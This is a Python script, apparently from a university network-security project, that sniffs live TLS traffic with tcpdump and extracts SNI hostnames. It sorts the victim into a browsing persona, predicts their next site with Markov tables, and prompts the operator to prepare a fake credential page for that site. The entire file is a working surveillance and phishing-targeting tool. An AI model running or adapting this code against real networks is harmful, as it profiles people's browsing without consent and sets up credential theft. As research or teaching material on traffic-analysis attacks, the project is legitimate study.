#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
attack.py -- Live SNI persona classifier and next-hop predictor.

Runs on Attacker VM. 
Spawns tcpdump, reads the live pcap stream, detects session boundaries, classifies the active user persona, 
and predicts where they will go next.

Python 2.7 compatible (Ubuntu 12.04).

Usage (run from scripts/):
    sudo python attack.py

Optional trained models from ``train.py``:

- Pickles (Python 3 interpreter recommended):

      sudo python3 attack.py --classifier-pkl ../models/popular_classifier.pkl \\
          --predictor-pkl ../models/markov.pkl --interface eth0

- JSON exports (Python 2.7 OK — run ``scripts/export_live_json.py`` once on Python 3):

      sudo python attack.py --classifier-pkl ../models/popular_classifier.json \\
          --predictor-pkl ../models/markov.json --interface eth0

When ``--classifier-pkl`` / ``--predictor-pkl`` are omitted, behavior matches
the original hardcoded CLASSIFIER / MARKOV tables.

High-level flow:
  1. Spawn tcpdump to capture raw TLS packets from the network
  2. Parse the pcap stream in real time to extract SNI hostnames
  3. Group SNIs into sessions using timing gaps (gap > SESSION_GAP = new session)
  4. After each new SNI, classify the user persona (student / shopper / news_reader)
  5. Predict where they will go next using the per-persona Markov table
  6. Print the session state, persona guess, and top-3 predictions to the terminal
"""

from __future__ import print_function
import argparse
import os
import struct
import subprocess
import sys

# parse_sni.py lives in the same folder. Add it to the path so we can import
# its pcap-parsing functions directly rather than duplicating them here.
_SCRIPTS_DIR = os.path.dirname(os.path.abspath(__file__))
_ROOT_DIR = os.path.dirname(_SCRIPTS_DIR)
sys.path.insert(0, _SCRIPTS_DIR)
import parse_sni

# When set by ``--classifier-pkl`` / ``--predictor-pkl``, ``classify`` / ``predict``
# delegate to these objects instead of the hardcoded dicts below.
_LIVE_CLASSIFIER = None
_LIVE_PREDICTOR = None

# ---------------------------------------------------------------------------
# Hardcoded models
#
# These stand in for trained pkl files until train.py is written.
# The classifier is a simple SNI-to-persona lookup table.
# The Markov tables encode "given I just visited X, where do I go next?"
#
# To swap in real trained models, replace the CLASSIFIER and MARKOV
# assignments below with:
#
#   import pickle
#   CLASSIFIER = pickle.load(open('../models/classifier.pkl', 'rb'))
#   MARKOV     = pickle.load(open('../models/markov.pkl',     'rb'))
#
# The rest of the code is identical either way — the dict structure is the same.
# ---------------------------------------------------------------------------

# SNIs that appear across all personas and carry no discriminative signal.
# The classifier ignores these when voting.
# Confirmed by trained popular_classifier.pkl:
#   google.com  -- student: 28, news_reader: 33, shopper: 27  (nearly uniform)
#   reddit.com  -- student: 23, news_reader: 25, shopper: 1   (too mixed to use)
SHARED = {'google.com', 'reddit.com'}

# Maps each persona-exclusive SNI to its persona label.
# Every SNI the victim visits gets looked up here. If it's exclusive to one
# persona, it casts a vote for that persona in the classifier.
# All mappings confirmed by trained popular_classifier.pkl -- every SNI below
# appears exclusively under one persona in the training data.
CLASSIFIER = {
    # student -- Purdue academic sites
    'purdue.edu':               'student',
    'mail.purdue.edu':          'student',
    'purdue.brightspace.com':   'student',
    'piazza.com':               'student',
    'gradescope.com':           'student',
    'edstem.org':               'student',
    'vocareum.com':             'student',
    'lib.purdue.edu':           'student',
    'mypurdue.purdue.edu':      'student',
    # shopper -- retail and payment sites
    'amazon.com':               'shopper',
    'ebay.com':                 'shopper',
    'walmart.com':              'shopper',
    'paypal.com':               'shopper',
    'bestbuy.com':              'shopper',
    'target.com':               'shopper',
    'etsy.com':                 'shopper',
    'craigslist.org':           'shopper',
    'venmo.com':                'shopper',
    # news_reader -- news outlets
    'cnn.com':                  'news_reader',
    'bbc.com':                  'news_reader',
    'reuters.com':              'news_reader',
    'nytimes.com':              'news_reader',
    'apnews.com':               'news_reader',
    'theguardian.com':          'news_reader',
    'foxnews.com':              'news_reader',
    'npr.org':                  'news_reader',
}

# Per-persona first-order Markov transition tables.
#
# Structure: {persona: {current_sni: {next_sni: probability}}}
#
# Each inner dict is a probability distribution over the next SNI given the
# current one. Values sum to ~1.0 per row.
#
# These probabilities were derived from the trained markov.pkl model
# (first_order_markov.py). Raw transition counts were extracted from the pkl,
# filtered to each persona's exclusive SNI vocabulary (shared SNIs like
# google.com and reddit.com were excluded from destination sets so they don't
# dilute persona-specific predictions), then normalized to sum to 1.0.
#
# Example derivation for purdue.edu:
#   Raw counts: brightspace=18, mail=10, mypurdue=7, lib=3  (total=38)
#   Probabilities: 18/38=0.47, 10/38=0.26, 7/38=0.18, 3/38=0.08
#
# If the current SNI has no row in the table (e.g. it was not seen during
# training), the predictor falls back to a flat uniform distribution over all
# SNIs in that persona's vocabulary.
MARKOV = {
    'student': {
        'purdue.edu':             {'purdue.brightspace.com': 0.47, 'mail.purdue.edu': 0.26, 'mypurdue.purdue.edu': 0.18, 'lib.purdue.edu': 0.08},
        'mail.purdue.edu':        {'gradescope.com': 0.38, 'piazza.com': 0.29, 'purdue.brightspace.com': 0.19, 'edstem.org': 0.14},
        'purdue.brightspace.com': {'piazza.com': 0.55, 'edstem.org': 0.32, 'gradescope.com': 0.14},
        'piazza.com':             {'gradescope.com': 0.42, 'edstem.org': 0.42, 'purdue.brightspace.com': 0.16},
        'gradescope.com':         {'edstem.org': 0.33, 'piazza.com': 0.33, 'vocareum.com': 0.33},
        'edstem.org':             {'vocareum.com': 0.46, 'gradescope.com': 0.38, 'piazza.com': 0.15},
        'vocareum.com':           {'gradescope.com': 0.50, 'edstem.org': 0.50},
        'lib.purdue.edu':         {'purdue.edu': 0.50, 'mypurdue.purdue.edu': 0.50},
        'mypurdue.purdue.edu':    {'mail.purdue.edu': 0.43, 'purdue.edu': 0.43, 'purdue.brightspace.com': 0.14},
    },
    'shopper': {
        'amazon.com':       {'paypal.com': 0.37, 'bestbuy.com': 0.23, 'ebay.com': 0.17, 'target.com': 0.13, 'walmart.com': 0.10},
        'ebay.com':         {'paypal.com': 0.40, 'amazon.com': 0.23, 'venmo.com': 0.20, 'craigslist.org': 0.17},
        'paypal.com':       {'amazon.com': 0.55, 'ebay.com': 0.31, 'venmo.com': 0.14},
        'walmart.com':      {'amazon.com': 0.40, 'paypal.com': 0.30, 'target.com': 0.30},
        'bestbuy.com':      {'amazon.com': 0.46, 'target.com': 0.23, 'paypal.com': 0.15, 'walmart.com': 0.15},
        'target.com':       {'amazon.com': 0.33, 'paypal.com': 0.33, 'etsy.com': 0.17, 'walmart.com': 0.17},
        'etsy.com':         {'target.com': 0.50, 'amazon.com': 0.50},
        'craigslist.org':   {'ebay.com': 0.75, 'venmo.com': 0.25},
        'venmo.com':        {'paypal.com': 0.50, 'ebay.com': 0.33, 'amazon.com': 0.17},
    },
    'news_reader': {
        'cnn.com':          {'bbc.com': 0.50, 'foxnews.com': 0.25, 'nytimes.com': 0.21, 'apnews.com': 0.04},
        'bbc.com':          {'reuters.com': 0.44, 'theguardian.com': 0.24, 'nytimes.com': 0.18, 'cnn.com': 0.13},
        'nytimes.com':      {'theguardian.com': 0.60, 'reuters.com': 0.25, 'bbc.com': 0.15},
        'reuters.com':      {'bbc.com': 0.47, 'apnews.com': 0.27, 'nytimes.com': 0.27},
        'apnews.com':       {'cnn.com': 0.67, 'bbc.com': 0.17, 'reuters.com': 0.17},
        'theguardian.com':  {'bbc.com': 0.33, 'reuters.com': 0.33, 'nytimes.com': 0.33},
        'foxnews.com':      {'apnews.com': 0.80, 'cnn.com': 0.20},
        'npr.org':          {'apnews.com': 0.40, 'reuters.com': 0.30, 'bbc.com': 0.30},  # manual (no training data)
    },
}

# Build a flat list of all SNIs per persona. Used as the fallback prediction
# pool when the current SNI has no Markov row (uniform distribution).
PERSONA_VOCAB = {
    persona: [sni for sni, p in CLASSIFIER.items() if p == persona]
    for persona in ('student', 'shopper', 'news_reader')
}

INTERFACE   = 'eth14'
SESSION_GAP = 4.0   # seconds — gap larger than this triggers a new session boundary


def _session_rows(session_id, snis, timestamps):
    """Turns live session into CSV-shaped rows for trained models (same schema as sessions.csv)."""
    rows = []
    for hop, sni in enumerate(snis):
        ts = timestamps[hop] if hop < len(timestamps) else float(hop)
        rows.append(
            {
                "session_id": session_id,
                "hop": hop,
                "timestamp": ts,
                "sni": sni,
                "persona": "",
            }
        )
    return rows


def _load_classifier_json(path):
    """Load classifier from JSON (stdlib only; Python 2.7 + 3.x)."""
    global _LIVE_CLASSIFIER
    import io
    import json

    import live_json_models

    with io.open(path, "r", encoding="utf-8") as f:
        spec = json.load(f)
    try:
        _LIVE_CLASSIFIER = live_json_models.build_classifier(spec)
    except ValueError as exc:
        sys.stderr.write("[attack.py] Classifier JSON: %s\n" % exc)
        sys.exit(1)


def _load_predictor_json(path):
    """Load next-site predictor from JSON (stdlib only; Python 2.7 + 3.x)."""
    global _LIVE_PREDICTOR
    import io
    import json

    import live_json_models

    with io.open(path, "r", encoding="utf-8") as f:
        spec = json.load(f)
    try:
        _LIVE_PREDICTOR = live_json_models.build_predictor(spec)
    except ValueError as exc:
        sys.stderr.write("[attack.py] Predictor JSON: %s\n" % exc)
        sys.exit(1)


def _load_classifier_pickle(path):
    """Load a persona classifier from ``train.py`` output (.pkl needs Python 3)."""
    global _LIVE_CLASSIFIER
    path = os.path.abspath(path)
    if path.lower().endswith(".json"):
        _load_classifier_json(path)
        return
    if sys.version_info[0] < 3:
        sys.stderr.write(
            "[attack.py] Loading classifier .pkl requires Python 3 "
            "(same as ``scripts/train.py``). "
            "Or export JSON: python3 scripts/export_live_json.py <file.pkl> "
            "and pass the resulting .json with --classifier-pkl.\n"
        )
        sys.exit(1)
    if _ROOT_DIR not in sys.path:
        sys.path.insert(0, _ROOT_DIR)
    import pickle

    from models.most_common_classifier import MostCommonClassifier
    from models.popular_classifier import PopularClassifier

    with open(path, "rb") as f:
        obj = pickle.load(f)
    if isinstance(obj, (PopularClassifier, MostCommonClassifier)):
        _LIVE_CLASSIFIER = obj
        return
    sys.stderr.write(
        "[attack.py] Unsupported classifier type in pickle: %r\n" % (type(obj),)
    )
    sys.exit(1)


def _load_predictor_pickle(path):
    """Load a next-site predictor from ``train.py`` output (.pkl needs Python 3)."""
    global _LIVE_PREDICTOR
    path = os.path.abspath(path)
    if path.lower().endswith(".json"):
        _load_predictor_json(path)
        return
    if sys.version_info[0] < 3:
        sys.stderr.write(
            "[attack.py] Loading predictor .pkl requires Python 3 "
            "(same as ``scripts/train.py``). "
            "Or export JSON: python3 scripts/export_live_json.py <file.pkl> "
            "and pass the resulting .json with --predictor-pkl.\n"
        )
        sys.exit(1)
    if _ROOT_DIR not in sys.path:
        sys.path.insert(0, _ROOT_DIR)

    path = os.path.abspath(path)
    # Hugging Face directory from ``train.py llm_predictor`` (not a .pkl file)
    if os.path.isdir(path):
        meta = os.path.join(path, "llm_predictor_meta.json")
        if os.path.isfile(meta):
            from models.llm_predictor import LLMPredictor

            _LIVE_PREDICTOR = LLMPredictor.load(path)
            return
        sys.stderr.write(
            "[attack.py] Directory %r has no llm_predictor_meta.json; "
            "expected models/llm_predictor/ from train.py llm_predictor.\n" % (path,)
        )
        sys.exit(1)

    import pickle

    from models.first_order_markov import FirstOrderMarkov
    from models.hidden_markov_predictor import HiddenMarkovPredictor
    from models.modified_hidden_markov_predictor import ModifiedHiddenMarkovPredictor
    from models.most_common_predictor import MostCommonPredictor

    with open(path, "rb") as f:
        obj = pickle.load(f)
    if isinstance(
        obj,
        (
            FirstOrderMarkov,
            MostCommonPredictor,
            HiddenMarkovPredictor,
            ModifiedHiddenMarkovPredictor,
        ),
    ):
        _LIVE_PREDICTOR = obj
        return
    sys.stderr.write(
        "[attack.py] Unsupported predictor type in pickle: %r\n" % (type(obj),)
    )
    sys.exit(1)


def _classify_from_pickle(seen_snis, timestamps, session_id):
    """Popular / most-common classifier + confidence matching vote share."""
    from collections import Counter

    rows = _session_rows(session_id, seen_snis, timestamps)
    pred = _LIVE_CLASSIFIER.predict(rows)
    if pred is None:
        return None, 0
    dom = getattr(_LIVE_CLASSIFIER, "dominant_persona_for_sni", None)
    if dom is None:
        # MostCommonClassifier: constant session label
        return pred, 100
    # PopularClassifier: confidence = vote share for the predicted persona
    votes = Counter()
    for sni in seen_snis:
        p = dom(sni)
        if p:
            votes[p] += 1
    if not votes:
        return pred, 0
    total = float(sum(votes.values()))
    return pred, int(round(votes[pred] / total * 100))


def _predict_from_pickle(seen_snis, timestamps, session_id, top_n):
    """Next-site distribution from a trained predictor (ignores legacy persona)."""
    rows = _session_rows(session_id, seen_snis, timestamps)
    ranked = _LIVE_PREDICTOR.predict(rows)
    if not ranked:
        return []
    out = []
    for sni, prob in ranked[:top_n]:
        out.append((sni, int(round(float(prob) * 100.0))))
    return out


# ---------------------------------------------------------------------------
# Step 1 & 2 — Stream live SNIs from tcpdump
# ---------------------------------------------------------------------------

def stream_sni(pipe):
    """
    Read a live pcap stream from file-like object `pipe` (tcpdump stdout).
    Yields (timestamp_float, sni_hostname) as TLS ClientHellos arrive.

    This is a streaming adaptation of parse_sni.read_pcap(). Instead of
    opening a file by path, it reads from the pipe tcpdump is writing to,
    so packets are processed as they arrive rather than after capture ends.

    The pcap format starts with a 24-byte global header that tells us the
    byte order and link-layer type, followed by a series of packet records.
    Each record has a 16-byte header (timestamps + length) then the raw frame.
    We strip the link + IP + TCP headers and hand the payload to the TLS parser.
    """
    # Read the global pcap header to determine byte order and link type
    gh = pipe.read(parse_sni.PCAP_GLOBAL_HEADER_LEN)
    if len(gh) < parse_sni.PCAP_GLOBAL_HEADER_LEN:
        return

    magic = struct.unpack('<I', gh[0:4])[0]
    if magic == parse_sni.PCAP_MAGIC_LE:
        endian = '<'
    elif magic == parse_sni.PCAP_MAGIC_BE:
        endian = '>'
    else:
        raise ValueError("Not a pcap stream (bad magic: 0x%x)" % magic)

    link_type = struct.unpack(endian + 'I', gh[20:24])[0]

    # Read packet records one at a time as they arrive from tcpdump
    while True:
        rh = pipe.read(parse_sni.PCAP_RECORD_HEADER_LEN)
        if len(rh) < parse_sni.PCAP_RECORD_HEADER_LEN:
            return  # pipe closed (tcpdump stopped)
        ts_sec, ts_usec, incl_len, _ = struct.unpack(endian + 'IIII', rh)
        data = pipe.read(incl_len)
        if len(data) < incl_len:
            return

        # Convert pcap timestamp to a float (seconds since epoch)
        ts = ts_sec + ts_usec / 1e6

        # Strip link/IP/TCP headers to get the raw TCP payload
        payload = parse_sni.extract_tcp_payload(link_type, data)
        if not payload:
            continue  # not a TCP packet we care about

        # Check if the TCP payload is a TLS ClientHello and extract the SNI
        sni = parse_sni.parse_client_hello_sni(payload)
        if sni:
            yield ts, sni  # hand the caller a (timestamp, hostname) pair

# ---------------------------------------------------------------------------
# Step 3 — Session boundary detection (handled in main loop)
# Step 4 — Classify the user persona
# ---------------------------------------------------------------------------

def classify(seen_snis, timestamps=None, session_id=0):
    """
    Determine the most likely persona from the SNIs seen so far in this session.

    Default (no ``--classifier-pkl``): frequency vote over the hardcoded
    ``CLASSIFIER`` dict; shared SNIs in ``SHARED`` are skipped.

    With ``--classifier-pkl``: delegates to the loaded ``PopularClassifier`` or
    ``MostCommonClassifier`` (Python 3). ``timestamps`` and ``session_id`` are
    used only in that mode to build row dicts like ``sessions.csv``.

    Returns (persona_string, confidence_pct) or (None, 0) when the model
    cannot produce a persona yet.
    """
    if _LIVE_CLASSIFIER is not None:
        ts = timestamps if timestamps is not None else []
        return _classify_from_pickle(seen_snis, ts, session_id)

    votes = {}
    for sni in seen_snis:
        if sni in SHARED:
            continue  # skip ambiguous SNIs
        persona = CLASSIFIER.get(sni)
        if persona:
            votes[persona] = votes.get(persona, 0) + 1

    if not votes:
        return None, 0  # only shared SNIs seen so far

    winner = max(votes, key=lambda p: votes[p])
    total  = sum(votes.values())
    confidence = int(round(votes[winner] / float(total) * 100))
    return winner, confidence

# ---------------------------------------------------------------------------
# Step 5 — Predict the next destination using the Markov table
# ---------------------------------------------------------------------------

def predict(
    persona,
    current_sni,
    top_n=3,
    seen_snis=None,
    timestamps=None,
    session_id=0,
):
    """
    Return the top_n most likely next SNIs as (hostname, percent).

    Default (no ``--predictor-pkl``): uses hardcoded per-persona ``MARKOV``;
    requires a non-None ``persona`` from ``classify``.

    With ``--predictor-pkl``: delegates to the loaded predictor (Markov / HMM /
    baselines). Uses the full ``seen_snis`` prefix when provided; ignores
    ``persona`` for those models.

    ``seen_snis`` / ``timestamps`` / ``session_id`` are only used in pickle mode.
    """
    if _LIVE_PREDICTOR is not None:
        snis = seen_snis if seen_snis is not None else [current_sni]
        ts = timestamps if timestamps is not None else []
        return _predict_from_pickle(snis, ts, session_id, top_n)

    if not persona:
        return []

    # Try to find a trained transition row for this SNI under the given persona
    row = MARKOV.get(persona, {}).get(current_sni)

    if row:
        # Trained row found -- rank by probability descending
        ranked = sorted(row.items(), key=lambda x: x[1], reverse=True)
    else:
        # No row -- fall back to uniform distribution over persona vocab
        vocab = PERSONA_VOCAB.get(persona, [])
        if not vocab:
            return []
        p = 1.0 / len(vocab)
        ranked = [(s, p) for s in vocab]

    # Convert probabilities to integer percentages for display
    return [(sni, int(round(prob * 100))) for sni, prob in ranked[:top_n]]

# ---------------------------------------------------------------------------
# Step 6 — Print the current session state to the terminal
# ---------------------------------------------------------------------------

def print_update(session_num, seen, persona, confidence, predictions):
    """
    Print a summary block for the current session after each new SNI arrives.
    Reprints the full session state each time so the attacker can follow along
    as the victim browses hop by hop.
    """
    print('')
    print('[SESSION %d]' % session_num)
    # Show the full chain of SNIs seen so far in this session
    print('  Seen:     %s' % ' -> '.join(seen))
    if persona:
        print('  Persona:  %s (confidence %d%%)' % (persona, confidence))
    else:
        # Hardcoded path: usually only shared SNIs so far. Pickle path may still
        # have next-site predictions without a persona label (e.g. Markov only).
        print('  Persona:  unknown (only shared SNIs seen so far)')
    if predictions:
        pred_str = ' | '.join('%s (%d%%)' % (s, p) for s, p in predictions)
        print('  Predicts: %s' % pred_str)
        print('  -> ACTION: Prepare fake %s credential page' % predictions[0][0])
    sys.stdout.flush()  # ensure output appears immediately (no buffering)

# ---------------------------------------------------------------------------
# Main -- wire everything together
# ---------------------------------------------------------------------------

def _parse_cli():
    p = argparse.ArgumentParser(
        description="Live SNI capture + persona classification + next-site prediction.",
    )
    p.add_argument(
        "-i",
        "--interface",
        default=None,
        help="tcpdump interface (default: INTERFACE constant in this file, e.g. eth14)",
    )
    p.add_argument(
        "--classifier-pkl",
        default=None,
        metavar="PATH",
        help="Path to popular_classifier.pkl/.json or most_common_classifier.pkl/.json",
    )
    p.add_argument(
        "--predictor-pkl",
        default=None,
        metavar="PATH",
        help="Path to markov.pkl/.json, most_common_predictor, HMM pkls/json",
    )
    return p.parse_args()


def main():
    global INTERFACE, _LIVE_CLASSIFIER, _LIVE_PREDICTOR

    args = _parse_cli()
    if args.interface:
        INTERFACE = args.interface
    if args.classifier_pkl:
        _load_classifier_pickle(os.path.abspath(args.classifier_pkl))
    if args.predictor_pkl:
        _load_predictor_pickle(os.path.abspath(args.predictor_pkl))

    # -U flag: write each packet to stdout immediately (packet-buffered mode).
    # Without -U, tcpdump buffers output and packets pile up before reaching us,
    # breaking the "live" feel of the demo.
    cmd = ['tcpdump', '-i', INTERFACE, '-n', '-s', '0', '-U', '-w', '-', 'tcp port 443']

    if _LIVE_CLASSIFIER is not None or _LIVE_PREDICTOR is not None:
        print(
            '[attack.py] Live models: classifier=%s predictor=%s'
            % (
                args.classifier_pkl or '(hardcoded)',
                args.predictor_pkl or '(hardcoded)',
            )
        )
    print('[attack.py] Starting live capture on interface %s' % INTERFACE)
    print('[attack.py] Waiting for TLS traffic... (Ctrl-C to stop)')
    print('')

    # Suppress tcpdump's own startup messages so they don't clutter the output
    devnull = open(os.devnull, 'w')
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=devnull)

    session_num = 0   # increments each time a gap > SESSION_GAP is detected
    seen        = []  # SNIs observed in the current session, in order
    seen_ts     = []  # parallel timestamps (for pickle-backed models)
    last_ts     = None

    try:
        for ts, sni in stream_sni(proc.stdout):

            # --- Step 3: session boundary detection ---
            # If enough time has passed since the last SNI, the victim has
            # moved on to a new browsing session. Reset state and increment counter.
            if last_ts is not None and (ts - last_ts) > SESSION_GAP:
                session_num += 1
                seen = []
                seen_ts = []

            seen.append(sni)
            seen_ts.append(ts)
            last_ts = ts

            # --- Steps 4 & 5: classify and predict ---
            persona, confidence = classify(seen, timestamps=seen_ts, session_id=session_num)
            if _LIVE_PREDICTOR is not None:
                predictions = predict(
                    persona,
                    sni,
                    seen_snis=seen,
                    timestamps=seen_ts,
                    session_id=session_num,
                )
            else:
                predictions = predict(persona, sni) if persona else []

            # --- Step 6: print the update ---
            print_update(session_num, seen, persona, confidence, predictions)

    except KeyboardInterrupt:
        print('\n[attack.py] Stopped.')
    finally:
        proc.terminate()
        devnull.close()

if __name__ == '__main__':
    main()
